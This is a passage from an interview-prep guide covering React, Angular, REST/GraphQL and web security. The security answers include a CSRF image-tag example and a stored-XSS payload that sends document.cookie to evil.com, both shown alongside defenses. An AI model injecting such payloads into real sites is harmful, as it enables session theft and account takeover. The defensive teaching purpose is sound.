**CSR — classic SPA.**

```
Browser → server → empty HTML + JS bundle
Browser runs JS → fetches data → renders → user sees content
```

User waits through: JS download + parse + execute + data fetch. Bad on slow networks. Bad for SEO if Googlebot doesn't run JS.

**SSR — render per request.**

```
Browser → server → server fetches data → renders full HTML → sends to browser
Browser shows content immediately → JS hydrates (attaches handlers)
```

User sees content fast (good TTFB). SEO works (full HTML in source). But every request hits the server — higher cost, harder to cache.

**SSG — render at build time.**

```
Build time: render every page once → static HTML files
Runtime: server (or CDN) serves static files
```

Blazing fast, cacheable everywhere, cheap. But you can't show personalised content without client-side JS.

**ISR — Next.js's hybrid.**

Generate statically at build, then re-generate in the background every N seconds (or on-demand). Get SSG performance with SSR-ish freshness.

**RSC — React Server Components (newest).**

Components that run only on the server. Fetch data without client-side JS, send the rendered output. Mix with `'use client'` boundaries for interactivity.

```jsx
// app/page.jsx (RSC by default in Next.js 13+ App Router)
async function Page() {
  const users = await db.users.find();   // runs on server
  return <UserList users={users} />;
}
```

**Picking a strategy.**

- Marketing site, blog → SSG (or ISR).
- E-commerce product pages → ISR.
- Dashboard / authenticated app → SSR or CSR.
- Mostly static + dynamic islands → RSC + selective client components.

---

### Q46. How do you handle data fetching in React?

**Don't roll your own with useEffect for anything serious.**

The naïve approach:

```jsx
function Profile({ id }) {
  const [data, setData] = useState();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState();
  
  useEffect(() => {
    let cancelled = false;
    setLoading(true);
    fetch(`/api/users/${id}`)
      .then(r => r.json())
      .then(d => { if (!cancelled) setData(d); })
      .catch(e => { if (!cancelled) setError(e); })
      .finally(() => { if (!cancelled) setLoading(false); });
    return () => { cancelled = true; };
  }, [id]);
  // ...
}
```

This is a lot of code per fetch, and it doesn't handle:
- Caching across components.
- Deduplication when two components ask for the same thing.
- Stale-while-revalidate (show cached data, refetch in background).
- Refetching on focus / reconnect.
- Retries.
- Pagination, infinite scroll.

**Use a query library.**

```jsx
import { useQuery } from '@tanstack/react-query';

function Profile({ id }) {
  const { data, isLoading, error } = useQuery({
    queryKey: ['user', id],
    queryFn: () => fetch(`/api/users/${id}`).then(r => r.json()),
    staleTime: 60_000,    // consider fresh for 1 minute
  });
  
  if (isLoading) return <Spinner />;
  if (error) return <Error error={error} />;
  return <UserCard user={data} />;
}
```

You get caching, dedup, retries, refetch-on-focus, automatic cancellation, and a much smaller component.

**Mutations.**

```jsx
const queryClient = useQueryClient();
const mutation = useMutation({
  mutationFn: (newUser) => fetch('/api/users', { method: 'POST', body: JSON.stringify(newUser) }),
  onSuccess: () => {
    queryClient.invalidateQueries({ queryKey: ['users'] });   // refetch the list
  }
});

mutation.mutate({ name: 'Alice' });
```

**Tools.**

- **TanStack Query** (formerly React Query) — most popular.
- **SWR** — Vercel's, simpler API.
- **RTK Query** — if you're already using Redux Toolkit.

---

### Q47. What's the difference between `useEffect` and `useLayoutEffect`?

**Both run after render. The difference is timing relative to paint.**

| | `useEffect` | `useLayoutEffect` |
|---|---|---|
| When it runs | After the browser paints | After DOM mutations, **before** paint |
| Blocks paint? | No | Yes |
| Use for | Most side effects | Reading DOM measurements, sync DOM mutations |

**When to use `useLayoutEffect`.**

When you need to measure the DOM and apply changes synchronously, so the user never sees an inconsistent intermediate state.

```jsx
function Tooltip({ targetRef }) {
  const tooltipRef = useRef();
  const [position, setPosition] = useState({ top: 0, left: 0 });
  
  useLayoutEffect(() => {
    // Measure the target's position
    const rect = targetRef.current.getBoundingClientRect();
    setPosition({ top: rect.top - 30, left: rect.left });
    // The browser paints the new position in the same frame
  }, [targetRef]);
  
  return <div ref={tooltipRef} style={position}>Hello</div>;
}
```

If we used `useEffect`, the user might see the tooltip flash at `(0, 0)` then jump to the correct position.

**Default to `useEffect`.** It doesn't block paint, so it's better for performance. Switch to `useLayoutEffect` only when you have a visible flicker or measurement-then-update pattern.

**SSR caveat.** `useLayoutEffect` doesn't run during server render and triggers a console warning. If you write a library, the workaround is to use `useEffect` on the server and `useLayoutEffect` in the browser.

---

### Q48. What's the React Suspense API?

**The intuition.**

Suspense lets a component "pause" rendering until something is ready (code chunk, data, image), showing a fallback in the meantime. It's React's way of handling async at the component boundary.

**Basic example: lazy-loaded code.**

```jsx
const HeavyChart = React.lazy(() => import('./HeavyChart'));

function Dashboard() {
  return (
    <Suspense fallback={<Spinner />}>
      <HeavyChart />
    </Suspense>
  );
}
```

When `<HeavyChart>` is rendered, React starts loading the chunk. While loading, it shows the `Spinner`. When ready, it renders the chart.

**Suspense for data.**

Originally, Suspense only worked for `React.lazy`. With newer libraries (Relay, TanStack Query in suspense mode, frameworks like Next.js), components can suspend on data too.

```jsx
function UserProfile({ id }) {
  const user = useSuspenseQuery({ queryKey: ['user', id], queryFn: ... });
  // If data isn't ready, this component "throws" a promise — Suspense catches it
  return <h1>{user.name}</h1>;
}

<Suspense fallback={<Spinner />}>
  <UserProfile id={5} />
</Suspense>
```

**Why Suspense matters.**

1. **Declarative loading states.** No `if (loading) return <Spinner>` in every component.
2. **Coordinated loading.** Group multiple async components under one Suspense — they all show one fallback together.
3. **Streaming SSR.** Server can send static parts of the page first, then stream in async parts as they're ready. Big perf win.
4. **Concurrent features.** With `useTransition`, suspending doesn't block; React keeps the old UI until ready, then swaps.

---

## 6. Angular (MEAN)

### Q49. AngularJS vs Angular. Why the rewrite?

**They're effectively different frameworks that share a name.**

| | AngularJS (1.x) | Angular (2+) |
|---|---|---|
| Released | 2010 | 2016 |
| Language | JavaScript | TypeScript |
| Architecture | Controllers + scopes + directives | Components |
| Change detection | Dirty checking on `$scope` | Zone.js + tree-based |
| Async | Promises (`$q`), callbacks | RxJS Observables |
| DI | String-based | Hierarchical, type-based |
| Mobile perf | Poor | Good (AOT compilation) |
| Modules | `angular.module(...)` | `NgModule` (now standalone components) |

**Why the rewrite?**

- AngularJS's dirty checking didn't scale — every async event re-checked all `$scope` bindings.
- Two-way binding via `$scope` was magical but fragile.
- No proper component model.
- Mobile performance was inadequate.

Angular 2+ was a clean redesign. They share the same team and design philosophy, but no shared code.

**Modern Angular (16+) highlights.**

- **Signals** — reactive primitives that don't depend on Zone.js.
- **Standalone components** — no more NgModules required.
- **`@if`, `@for`, `@switch`** — new control-flow syntax replacing `*ngIf`, `*ngFor`.
- **Zoneless mode** (experimental in 18+) — drops Zone.js entirely.

---

### Q50. Explain Angular's component lifecycle hooks.

**The hooks, in order.**

| Hook | When it fires |
|---|---|
| `ngOnChanges` | Whenever an `@Input()` value changes (also before `ngOnInit`) |
| `ngOnInit` | Once, after the first `ngOnChanges`. Most setup goes here. |
| `ngDoCheck` | Every change detection run. Use sparingly — performance trap. |
| `ngAfterContentInit` | Once, after content (`ng-content`) is projected. |
| `ngAfterContentChecked` | After every check of projected content. |
| `ngAfterViewInit` | Once, after the component's view (and child views) is initialised. |
| `ngAfterViewChecked` | After every check of the view. |
| `ngOnDestroy` | Right before the component is destroyed. Clean up here. |

**Practical example.**

```ts
@Component({...})
export class UserDetailComponent implements OnInit, OnDestroy {
  @Input() userId!: string;
  user?: User;
  private sub = new Subscription();
  
  constructor(private userService: UserService) {}
  
  ngOnInit() {
    this.sub.add(
      this.userService.getUser(this.userId).subscribe(u => this.user = u)
    );
  }
  
  ngOnDestroy() {
    this.sub.unsubscribe();   // critical — prevent memory leaks
  }
}
```

**Common pitfalls.**

- **Forgetting `ngOnDestroy`** — subscriptions, timers, listeners must be cleaned up.
- **Heavy work in `ngDoCheck`** — fires constantly. Avoid.
- **Updating state in `ngAfterViewChecked`** — can cause `ExpressionChangedAfterItHasBeenCheckedError`.

**Modern alternative: `takeUntilDestroyed()`.**

Angular 16+ provides a cleaner pattern:

```ts
import { takeUntilDestroyed } from '@angular/core/rxjs-interop';

ngOnInit() {
  this.userService.getUser(this.userId)
    .pipe(takeUntilDestroyed())
    .subscribe(u => this.user = u);
}
```

No more manual subscription tracking.

---

### Q51. What is Dependency Injection in Angular?

**The intuition.**

Dependency Injection (DI) is a pattern where a class **declares** what it needs (in its constructor) and the framework **provides** the dependencies. The class doesn't create them itself.

**Without DI:**

```ts
class UserService {
  private http = new HttpClient();   // tightly coupled, hard to test
}
```

**With DI:**

```ts
@Injectable({ providedIn: 'root' })
export class UserService {
  constructor(private http: HttpClient) {}   // Angular provides HttpClient
}
```

Angular's injector sees the constructor signature, finds (or creates) an `HttpClient` instance, and passes it in.

**Why this matters.**

1. **Testability.** In a test, you swap `HttpClient` for a mock. The service doesn't know or care.
2. **Singletons by default.** `providedIn: 'root'` means one instance app-wide.
3. **Loose coupling.** Services don't know how their dependencies are constructed.

**Hierarchical injectors.**

Angular has a tree of injectors. A service provided at the root is a singleton. A service provided in a component is scoped to that component and its children.

```ts
@Component({
  selector: 'app-cart',
  providers: [CartService]   // new instance for each <app-cart>
})
export class CartComponent { ... }
```

This is useful when you want **stateful per-component services** (e.g., a wizard with its own state).

**Tree-shakable providers.**

`providedIn: 'root'` is preferred over module-level `providers: []` because:
- The service is tree-shaken if unused.
- No need to update `NgModule` when adding services.

---

### Q52. Observables vs Promises. When does Angular use which?

**The core differences.**

| | Promise | Observable |
|---|---|---|
| Values | Exactly one (resolve or reject) | Zero, one, or many over time |
| Eager/lazy | Eager — runs as soon as created | Lazy — runs only on `subscribe()` |
| Cancellable | No (well, with AbortController, sort of) | Yes — `unsubscribe()` |
| Operators | Limited (`then`, `catch`, `finally`) | Rich (RxJS: 100+ operators) |
| Multicast | No | Yes (Subjects) |

**Angular uses Observables everywhere.**

- `HttpClient` — every request returns `Observable<T>`.
- Reactive Forms — value/status changes are observables.
- Router events — observable.
- Component `@Output()` events use `EventEmitter`, which extends `Subject`.

**Example.**

```ts
// HTTP returns an Observable
this.http.get<User>(`/api/users/${id}`).subscribe(user => {
  this.user = user;
});

// Convert to Promise if you really need to
const user = await firstValueFrom(this.http.get<User>(`/api/users/${id}`));
```

**Why observables (despite the learning curve)?**

For real-time data (websockets, search-as-you-type, polling), you need streams of values, not single resolutions. RxJS gives you operators (`debounce`, `switchMap`, `combineLatest`) that compose those streams elegantly.

---

### Q53. Common RxJS operators you've used.

**The essentials.**

| Operator | What it does |
|---|---|
| `map` | Transform each emitted value |
| `filter` | Drop values that don't pass a predicate |
| `tap` | Side effect (logging) without changing values |
| `debounceTime` | Wait for X ms of silence before emitting |
| `distinctUntilChanged` | Skip consecutive duplicate values |
| `switchMap` | Switch to a new inner observable, **cancelling** the previous |
| `mergeMap` | Run inner observables in parallel, merge results |
| `concatMap` | Queue inner observables, run sequentially |
| `exhaustMap` | Ignore new values while one inner is in flight |
| `catchError` | Handle errors and recover |
| `retry` | Retry on error N times |
| `combineLatest` | Combine multiple streams into one (latest from each) |
| `forkJoin` | Wait for all to complete, like `Promise.all` |
| `takeUntil` | Stop when another observable emits |

**The classic search input pipeline.**

```ts
this.search.valueChanges.pipe(
  debounceTime(300),                      // wait for typing pause
  distinctUntilChanged(),                 // skip if value didn't change
  switchMap(q => this.api.search(q)),     // cancel previous search
  catchError(err => of([])),              // recover on error
).subscribe(results => this.results = results);
```

Without `switchMap`, you'd get race conditions — old slow responses arriving after newer ones.

**`switchMap` vs `mergeMap` vs `concatMap` vs `exhaustMap`.**

| Operator | Behaviour | Use case |
|---|---|---|
| `switchMap` | Cancel previous, start new | Search/typeahead — only latest matters |
| `mergeMap` | Run all in parallel | Independent operations |
| `concatMap` | Queue them | Operations that must be sequential |
| `exhaustMap` | Ignore new while one is running | Login button (don't fire multiple logins) |

---

### Q54. Template-driven vs Reactive Forms.

**Two approaches with the same goal.**

**Template-driven** — logic in the HTML using `ngModel`.

```html
<input name="email" [(ngModel)]="email" required email />
<button (click)="submit()" [disabled]="!form.valid">Submit</button>
```

```ts
email = '';
submit() { console.log(this.email); }
```

Quick for small forms. Validation is in the template. Hard to unit test.

**Reactive Forms** — form definition in TypeScript.

```ts
form = this.fb.group({
  email: ['', [Validators.required, Validators.email]],
  age: [18, [Validators.min(18)]],
});

constructor(private fb: FormBuilder) {}

submit() {
  if (this.form.valid) console.log(this.form.value);
}
```

```html
<form [formGroup]="form" (ngSubmit)="submit()">
  <input formControlName="email" />
  <input formControlName="age" type="number" />
  <button type="submit" [disabled]="!form.valid">Submit</button>
</form>
```

**Why reactive forms win at the senior level.**

- Form definition is in code → testable, refactorable.
- Easier dynamic forms (add/remove fields at runtime).
- Composable validators (sync and async).
- Observable streams for value/status changes (`this.form.valueChanges.pipe(...)`).
- Better with TypeScript types.

For anything more than a single text input, prefer reactive.

---

### Q55. How does change detection work in Angular?

**The high-level flow.**

1. Something async happens (click, HTTP response, timeout, etc.).
2. **Zone.js** intercepts it and tells Angular.
3. Angular runs **change detection** — walks the component tree top-down.
4. For each component, compares current bindings to last values.
5. Updates the DOM where things changed.

**Default strategy — `ChangeDetectionStrategy.Default`.**

Every async event triggers a check of the entire tree. Simple, works automatically, can be slow in large apps.

**`OnPush` strategy — opt into performance.**

```ts
@Component({
  changeDetection: ChangeDetectionStrategy.OnPush
})
```

A component is checked only when:

- An `@Input()` reference changes (`===` comparison; mutating an object doesn't count).
- An event from inside the component fires (click, etc.).
- An async pipe in the template emits.
- You manually call `ChangeDetectorRef.markForCheck()`.

**Why OnPush is faster.**

Most of your tree doesn't need to be checked on every event. With OnPush + immutable data + observables (via `async` pipe), you only check what actually changed.

**The pattern:**

```ts
@Component({
  changeDetection: ChangeDetectionStrategy.OnPush,
  template: `
    <user-card *ngFor="let u of users$ | async" [user]="u"></user-card>
  `
})
export class UsersComponent {
  users$ = this.api.getUsers();   // observable
}
```

**Signals — the future.**

Angular 16+ added **signals**, a reactive primitive that doesn't need Zone.js:

```ts
count = signal(0);
double = computed(() => this.count() * 2);

increment() { this.count.update(c => c + 1); }
```

The compiler tracks reads and updates only what depends on changed signals — finer-grained than OnPush.

Angular 18+ has experimental **zoneless** mode that drops Zone.js entirely.

---

### Q56. What's an Angular module (`NgModule`)? Standalone components?

**The original world: NgModules.**

Every component, directive, and pipe had to belong to an `NgModule`:

```ts
@NgModule({
  declarations: [UserComponent, UserListComponent],   // owned
  imports: [CommonModule, HttpClientModule],          // depended on
  exports: [UserComponent],                           // re-exported
  providers: [UserService],
})
export class UsersModule {}
```

NgModules were how Angular organised features and supported lazy loading.

**The problems.**

- Verbose. New components meant updating the module too.
- Confusing for newcomers — when do I add to `declarations`? `imports`? `providers`?
- Lazy loading required entire modules even if you wanted just one route.

**Standalone components (Angular 14+).**

A standalone component declares its own dependencies:

```ts
@Component({
  standalone: true,
  imports: [CommonModule, RouterModule],
  selector: 'app-user',
  template: `<a routerLink="/users">Users</a> {{ name }}`,
})
export class UserComponent { ... }
```

No NgModule needed. Each component is self-contained.

**Angular 17 made standalone the default for new apps.** NgModules still work but are increasingly considered legacy.

**Lazy-loading with standalone:**

```ts
const routes: Routes = [
  {
    path: 'admin',
    loadComponent: () => import('./admin.component').then(m => m.AdminComponent)
  }
];
```

---

### Q57. How do you handle authentication in Angular?

**The full picture.**

1. **Login** — POST credentials, receive a token.
2. **Storage** — store the token securely.
3. **Attach token to requests** — via an `HttpInterceptor`.
4. **Protect routes** — via an `AuthGuard` (or `canActivate` function in v15+).
5. **Refresh tokens** — handle 401s by refreshing and retrying.
6. **Logout** — clear token, redirect.

**Step 3: Interceptor to attach the token.**

```ts
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(AuthService).getToken();
  const authReq = token
    ? req.clone({ setHeaders: { Authorization: `Bearer ${token}` } })
    : req;
  return next(authReq);
};

// app.config.ts
provideHttpClient(withInterceptors([authInterceptor]))
```

**Step 4: Route guard.**

```ts
export const authGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  const router = inject(Router);
  if (auth.isLoggedIn()) return true;
  router.navigate(['/login']);
  return false;
};

// routes
{ path: 'profile', component: ProfileComponent, canActivate: [authGuard] }
```

**Step 5: Refresh token flow.**

On 401, intercept, hit `/refresh`, retry the original request. Queue concurrent requests so you only refresh once.

**Storage caveat.**

- `localStorage` — easy but vulnerable to XSS. ANY injected script can steal your token.
- `httpOnly` cookie — safe from XSS. Best for SPAs.
- In-memory + `httpOnly` refresh cookie — best balance: access token in JS memory (lost on refresh, refreshed via cookie), refresh token in cookie.

---

### Q58. Lazy loading routes in Angular.

**The benefit.**

Without lazy loading, all your code loads on app start. With lazy loading, code for `/admin` only loads when the user visits `/admin`. Faster initial page load, smaller initial bundle.

**Standalone routes (modern syntax).**

```ts
const routes: Routes = [
  { path: '', component: HomeComponent },
  {
    path: 'admin',
    loadChildren: () =>
      import('./admin/admin.routes').then(m => m.ADMIN_ROUTES)
  }
];
```

**`admin.routes.ts`:**

```ts
export const ADMIN_ROUTES: Routes = [
  { path: '', component: AdminDashboardComponent },
  { path: 'users', component: AdminUsersComponent },
];
```

When the user navigates to `/admin`, Angular downloads the admin chunk and renders.

**Preloading strategies.**

Initial load is fast, but the first navigation to `/admin` has a delay. Preloading mitigates this:

```ts
import { PreloadAllModules } from '@angular/router';

provideRouter(routes, withPreloading(PreloadAllModules))
```

After the app boots, Angular fetches lazy chunks in the background. By the time the user clicks, the code is already there.

For more nuance, write a custom strategy that preloads only certain routes (e.g., only when on WiFi, or only top-level).

---

## 7. REST APIs & GraphQL

### Q59. REST best practices you follow.

**Resource naming.**

- **Nouns, not verbs.** `/users/123` ✅, not `/getUser?id=123` ❌.
- **Plural resources.** `/users`, `/orders/42/items`.
- **Hierarchy reflects relationships.** `/users/42/orders` for a user's orders.

**HTTP verbs.**

| Verb | Use |
|---|---|
| `GET` | Read. Idempotent, safe, cacheable. |
| `POST` | Create (or non-idempotent action). |
| `PUT` | Replace the entire resource. Idempotent. |
| `PATCH` | Partial update. |
| `DELETE` | Remove. Idempotent. |

**Status codes — use the right one.**

| Code | Meaning |
|---|---|
| 200 | OK |
| 201 | Created |
| 204 | No content (success, empty body) |
| 400 | Bad request (malformed) |
| 401 | Unauthorised (not logged in) |
| 403 | Forbidden (logged in but not allowed) |
| 404 | Not found |
| 409 | Conflict (e.g., duplicate email) |
| 422 | Unprocessable entity (validation failed) |
| 429 | Too many requests (rate limited) |
| 500 | Internal server error |
| 503 | Service unavailable |

**Versioning.**

- URL path: `/v1/users`, `/v2/users`. Most common.
- Accept header: `Accept: application/vnd.myapi.v2+json`. Cleaner but harder to test.

**Consistent error format.**

```json
{
  "error": {
    "code": "USER_NOT_FOUND",
    "message": "User 42 not found",
    "details": { "userId": 42 }
  }
}
```

**Pagination.**

- Cursor for large/infinite lists (feeds, search).
- Offset for small bounded lists (admin tables).

**Idempotency.**

- `PUT`, `DELETE` are idempotent by definition.
- `POST` operations that can be retried (payment, sending email): accept an `Idempotency-Key` header. Server stores the result and returns the same response on retry.

**Responses.**

- Return the created resource on `POST` (with `201` and `Location` header).
- Don't put auth tokens in URL params (they end up in logs).

---

### Q60. PUT vs PATCH vs POST.

**The differences.**

| Method | Semantics | Idempotent | Body |
|---|---|---|---|
| `POST` | Create or non-idempotent action | No | Full or partial, depends |
| `PUT` | Replace entire resource | Yes | Full representation |
| `PATCH` | Partial update | Sometimes (depends on body) | Patch document |

**Examples.**

```http
POST /users
Content-Type: application/json
{ "name": "Alice", "email": "..." }

201 Created
Location: /users/42
```

```http
PUT /users/42
Content-Type: application/json
{ "name": "Alice", "email": "...", "age": 30, ... ALL FIELDS }
```

PUT replaces the resource entirely. If you omit a field, it's gone.

```http
PATCH /users/42
Content-Type: application/json
{ "email": "new@example.com" }
```

PATCH updates only what's specified.

**JSON Patch (RFC 6902) — formal patch documents.**

```http
PATCH /users/42
Content-Type: application/json-patch+json
[
  { "op": "replace", "path": "/email", "value": "new@example.com" },
  { "op": "remove", "path": "/phone" }
]
```

Used in some APIs but less common than the simpler "merge" style.

**In practice.**

Most APIs use `PATCH` for any update because full replacements (`PUT`) are rarely what users want. `POST` for creation. `PUT` is more relevant in REST-purist designs.

---

### Q61. Pagination strategies.

**Two main approaches.**

**Offset/limit — easy but limited.**

```http
GET /users?page=3&limit=20
```

SQL: `LIMIT 20 OFFSET 40`.

Pros:
- Easy to implement, easy to jump to page N.
- Total count is straightforward.

Cons:
- **Slow on large tables.** The DB has to skip N rows. Page 1000 with limit 20 means scanning 20,000 rows.
- **Unstable when data changes.** If items are added between page loads, you might see duplicates or skip items.

**Cursor-based — scalable and stable.**

```http
GET /users?after=eyJpZCI6MTIzfQ&limit=20
```

The cursor encodes "where I left off" (often a base64'd JSON of `{id: 123}`).

SQL: `WHERE id > 123 ORDER BY id LIMIT 20`.

Pros:
- **Fast at any depth.** No row skipping.
- **Stable.** New items don't shift your pages.
- **Forward-only is natural.** Great for feeds and infinite scroll.

Cons:
- Can't jump to "page 50."
- Slightly harder to implement total counts.

**Use cases.**

| Scenario | Pagination |
|---|---|
| Admin user list | Offset (small dataset, "go to page" UX) |
| Twitter feed | Cursor (huge, infinite scroll) |
| Search results | Cursor or hybrid |
| Reports table | Offset (export use case) |

**Cursor implementation tip.**

Use a stable, monotonic field (auto-increment ID, or `(createdAt, id)` for tiebreaker on ties). Encode it so clients treat it as opaque.

---

### Q62. REST vs GraphQL. When would you pick GraphQL?

**REST in one paragraph.** Resources at URLs. Verbs are HTTP verbs. Caching is HTTP caching. Each request fetches a fixed shape.

**GraphQL in one paragraph.** Single endpoint (`/graphql`). Clients send queries describing exactly the fields they want. Server has resolvers that fetch each field. Strong type system (the schema).

**GraphQL strengths.**

- **Clients ask for what they need.** No over-fetching, no under-fetching. One mobile screen might need just `{id, name}`; the desktop might want everything.
- **Single endpoint.** No fanning out across many REST calls.
- **Strong types.** Self-documenting schema. Tools like GraphiQL.
- **Aggregates across services.** Resolvers can hit multiple backends per query.

**REST strengths.**

- **Simpler.** No schema, no resolvers, no DataLoader.
- **HTTP caching out of the box.** GET requests cache via standard headers.
- **Easier rate limiting and observability.** "How many requests to /users?" is trivial; "how expensive was this GraphQL query?" is hard.
- **Universally understood.** Public API consumers expect REST.

**When GraphQL pays off.**

- Multiple clients with very different data needs (web, iOS, Android, watch).
- Mobile bandwidth is critical — clients fetch only what they show.
- Backend-for-frontend aggregating multiple microservices.
- Big internal apps with rich relationships and changing UI needs.

**When REST stays the better choice.**

- Public API. Consumers expect REST and HTTP caching.
- Small team. GraphQL has real ops overhead (N+1 with DataLoader, query depth limiting, persisted queries, complexity analysis).
- Simple CRUD app with one client.

**Common GraphQL pitfalls at scale.**

- **N+1 problem** (next question).
- **Unbounded queries** — clients can request deep nested data, blowing up your DB.
- **Caching is harder** — POST requests with bodies, no URL to key on.
- **Versioning** is awkward (the schema is global).

---

### Q63. What's the N+1 problem in GraphQL? How do you solve it?

**The problem.**

Consider a query:

```graphql
{
  posts {
    title
    author { name }
  }
}
```

The naive resolver:
1. Run `Post.find()` — gets 100 posts. (1 query)
2. For each post, call the author resolver, which runs `User.findById(post.authorId)` — 100 queries.
3. Total: **101 queries**.

**The solution: DataLoader.**

DataLoader batches multiple `.load(id)` calls within the same tick into a single batched query.

```js
const userLoader = new DataLoader(async (ids) => {
  const users = await User.find({ _id: { $in: ids } });
  // IMPORTANT: must return in the same order as ids
  return ids.map(id => users.find(u => u._id.equals(id)));
});

// In the author resolver
authorResolver(post) {
  return userLoader.load(post.authorId);
}
```

Now:
1. `Post.find()` — 1 query.
2. All 100 author resolvers call `userLoader.load(authorId)`.
3. DataLoader batches them — 1 query: `User.find({ _id: { $in: [...100 ids...] } })`.
4. Total: **2 queries**.

**Critical:** create a fresh DataLoader **per request** (not a global instance). Otherwise you'll cache across users and leak data.

**DataLoader also caches.** Within a single request, calling `userLoader.load(id)` twice returns the same promise — no duplicate fetch.

---

## 8. Authentication & Security

### Q64. JWT vs Session-based auth. Pros and cons.

**Session-based — stateful.**

1. User logs in. Server creates a session row in DB/Redis.
2. Server returns a cookie containing the session ID.
3. On each request, server looks up the session by ID.

**Pros:**
- Revocation is instant — delete the session row.
- Simple model.
- Works with `httpOnly` cookies → safe from XSS.

**Cons:**
- Server-side state — needs a session store (Redis usually).
- Harder across services without a shared store.

**JWT (JSON Web Token) — stateless.**

A JWT is `header.payload.signature`. The payload contains claims (user ID, roles, expiry). The signature proves it wasn't tampered with.

1. User logs in. Server signs a JWT with claims.
2. Client stores it (cookie or memory) and sends it on each request.
3. Server validates the signature — no DB lookup.

**Pros:**
- Stateless — easy to scale, easy to share across services.
- Self-contained — claims travel with the token.

**Cons:**
- **Revocation is hard.** Once issued, the JWT is valid until it expires. To revoke, you need a deny list (which... defeats statelessness).
- Larger than session IDs (whole encoded payload travels with every request).
- If your secret leaks, every active token can be forged.

**The pragmatic middle ground: short-lived JWTs + refresh tokens.**

- Access token: JWT, short-lived (5–15 minutes).
- Refresh token: opaque, stored server-side (allowlist or DB).
- When access token expires, client uses refresh token to get a new one.
- Revocation: delete the refresh token. Worst case, an access token works for a few more minutes.

**My default in 2025+.**

For browser SPAs: session cookies (httpOnly). Easier and safer.
For server-to-server APIs: opaque tokens with introspection, or short-lived JWTs.

---

### Q65. Where do you store the JWT in the browser?

**Three options, ranked.**

**1. `httpOnly` cookie — best for most apps.**

```http
Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax
```

- **Safe from XSS** (JS can't read it).
- Sent automatically with requests.
- Need to handle CSRF (use `SameSite=Lax` and/or CSRF tokens for state-changing endpoints).

**2. In-memory + httpOnly refresh cookie — balance for SPAs.**

- Access token in a JS variable (lost on refresh).
- Refresh token in `httpOnly` cookie.
- On page load, hit `/refresh` to get a new access token.

Pros: access token is never on disk; XSS can grab it but not persistently.

**3. `localStorage` — DON'T.**

```js
localStorage.setItem('token', jwt);   // ❌
```

ANY injected script can read it. One XSS = full account takeover.

People do this because it's easy. It's a real security gap, especially for sites with rich third-party scripts (analytics, ads).

**Rule of thumb.** If you can use `httpOnly` cookies, use them. If you must use JavaScript-accessible storage, keep tokens in memory only.

---

### Q66. What is CSRF and how do you prevent it?

**The attack.**

Your user is logged into `bank.com`. They visit `evil.com`. evil.com has:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

The browser auto-attaches the bank.com session cookie. The bank's server can't distinguish this from a legitimate request — same cookie, same user.

**Defenses (use multiple).**

**1. `SameSite` cookies — the modern default.**

```http
Set-Cookie: session=...; SameSite=Lax
```

- `Lax` (default in modern browsers) — cookie not sent on cross-site **requests** except top-level GET navigations.
- `Strict` — cookie not sent on any cross-site request.
- `None` — required if you genuinely need cross-site (e.g., embedded widgets).

In modern browsers, `SameSite=Lax` alone blocks most CSRF.

**2. CSRF tokens — defence in depth.**

Server generates a token, sends it in the form/page. Client must echo it in a header on state-changing requests. Attacker can't forge it because they can't read the page.

```html
<input type="hidden" name="_csrf" value="abc123">
```

```js
// Or via header
fetch('/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
});
```

`csurf` middleware in Express implements this.

**3. Don't use GET for state changes.**

`GET /delete?id=42` is wrong on multiple levels — it can be triggered by image tags, prefetch, link clicks. Always `POST`/`PUT`/`DELETE` for mutations.

**4. Origin/Referer check.**

For sensitive endpoints, check `Origin` or `Referer` matches your domain. Defence in depth.

---

### Q67. What is XSS? Prevention?

**The attack.**

An attacker injects JavaScript into your page that other users execute. The injected code runs with the victim's session — full account takeover.

**Three flavours.**

| Type | Where the payload lives |
|---|---|
| **Stored** | In the database — every visitor runs it (e.g., comment field) |
| **Reflected** | In a URL/query param — victim must click a malicious link |
| **DOM-based** | Rendered by client-side JS from URL or other sources |

**Example: stored XSS.**

```js
// Vulnerable code
res.send(`<div>${userComment}</div>`);

// Attacker submits a comment:
"<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>"

// Now every visitor's cookies leak.
```

**Prevention.**

**1. Output encoding — escape user input by context.**

In React, text is auto-escaped:
```jsx
<div>{userComment}</div>   // safe — React escapes
```

But:
```jsx
<div dangerouslySetInnerHTML={{ __html: userComment }} />   // dangerous
```

In Express + EJS / Handlebars / etc., `{{ }}` (double-stash) escapes; `{{{ }}}` (triple) doesn't. Know your template engine.

**2. Sanitize HTML if you allow rich text.**

If users need to submit `<b>`, `<i>`, etc., use a library to strip everything else:

```js
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
```

**3. Content Security Policy (CSP).**

A header that tells the browser what scripts are allowed.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

Disallows inline scripts and only loads scripts from your own domain and trusted CDNs. Prevents most XSS payloads from running even if they're injected.

**4. `httpOnly` cookies.**

Even if XSS happens, it can't steal `httpOnly` cookies — at least the session cookie is safe.

---

### Q68. How do you store passwords?

**The rule.**

Hash with **bcrypt**, **scrypt**, or **argon2**. These are slow on purpose — designed to make brute-force expensive.

**Why not SHA-256 / MD5?**

Modern GPUs compute billions of SHA-256 hashes per second. A leaked database of SHA-256 password hashes is essentially plaintext given a few hours.

bcrypt is intentionally slow. A "cost factor" of 12 means ~250ms per hash on modern hardware. For a user logging in, 250ms is invisible. For an attacker trying billions, it's prohibitive.

**Example with bcrypt.**

```js
const bcrypt = require('bcrypt');

// Sign-up
const hash = await bcrypt.hash(password, 12);   // cost factor 12
await db.users.create({ email, passwordHash: hash });

// Login
const user = await db.users.findOne({ email });
const ok = await bcrypt.compare(password, user.passwordHash);
if (!ok) throw new Error('Invalid');
```

**Salt is included automatically.** bcrypt's output is `$2b$12$saltsalt...hashhash...` — the salt is part of the string. Each password gets a unique salt, so two users with the same password get different hashes.

**Bump the cost factor every couple of years.** As CPUs get faster, increase the cost (12 → 13 → 14). When users log in, you can re-hash with the new cost transparently.

**argon2** is now considered the gold standard (winner of the Password Hashing Competition). Use it if you can; bcrypt is still fine.

**Never:**
- Store passwords in plaintext.
- Use SHA / MD5 alone.
- Use a global salt instead of per-password.
- Email passwords back (you don't have them — and shouldn't).

---

